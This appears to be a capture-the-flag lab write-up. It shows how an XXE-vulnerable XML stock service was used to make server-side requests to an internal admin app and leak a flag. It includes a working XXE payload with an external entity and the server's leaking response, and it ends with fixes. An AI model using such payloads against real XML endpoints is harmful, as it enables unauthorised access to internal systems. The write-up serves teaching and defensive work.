# XXE SSRF CHALLENGE SOLUTION
## Overview
This challenge requires to connect to a private server, situated in a network and accessible only by hosts on that network, to find a flag.
To find the flag I sent a request to an XXE vulnerable server situated in the network to perform a SSRF attack to the target server.

## Vulnerability
XML store1 and XML store2 are vulnerable to XXE attack that lets the attacker perform requests from them.
Moreover Admin app doesn't use a strong authentication mechanism.

## Attack
From the page [http://localhost:5000/store?product_type=kimono](http://localhost:5000/store?product_type=kimono) of the central store, I saw (using `network` tab of Mozilla browser) that several JQuery requests went from my browser to XML Store1 and XML Store2 ([http://localhost:5001/stocks](http://localhost:5001/stocks) and [http://localhost:5002/stocks](http://localhost:5002/stocks)).  
There are two types of requests:
- OPTIONS requests, that are preflight requests (see: [https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)).
- POST requests that have an xml body.

```xml
<?xml version='1.0' encoding='utf-8'?><stocks><productID>1</productID></stocks>
```
I started to play with that xml body to exploit the XXE vulnerability.

First of all I used postman to send a POST request to [localhost:5002/stocks](localhost:5002/stocks) with the body above (setting body type: raw-xml).
XML server2 responded with body: `499`.

Then I sent a request with the body:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://172.200.1.21:8080/"> ]>
<stocks>
<productID>&xxe;</productID>
</stocks>
```
Remember that `http://172.200.1.21:8080/` is the url of Admin app.
XML server1 responded with a 400 response with the following body:
```
Invalid <productID> content: <html>
<body>
<nav>
  <a>Home</a> |
  <a>Info</a> |
  <a>Contacts</a>
</nav>

<h1>Welcome Admin</h1>

<p>No auth needed, we know you are in our network</p>

<p>flg{Do_No7_tRuS7_HomEM4de_P4RSeR}</p>
</body>
</html>
```

You can notice that the response included the page (with the flag) that is served by Admin app, in fact the XML parser of XML store1 tried to resolve the external entity &xxe; sending a request to `http://172.200.1.21:8080/` and put the response value into the XML code. Then the XML Store1 server didn't recognize the <productID> element content and sent me a 400 response including that content into the body.

## Fix
The main vulnerabilities in this challenge are:
- Weak authentication mechanism of Admin app
- XXE vulnerable parser in XML Store1 and XML Store2

The first can be fixed implementing a simple Authentication mechanism (example: require login).
The second can be fixed disablig external entities manually (I used SAXParserFactory as a parser, see: [https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)) or use another parser, in fact in other libraries of high level languages (like python), external entities are disabled by default.

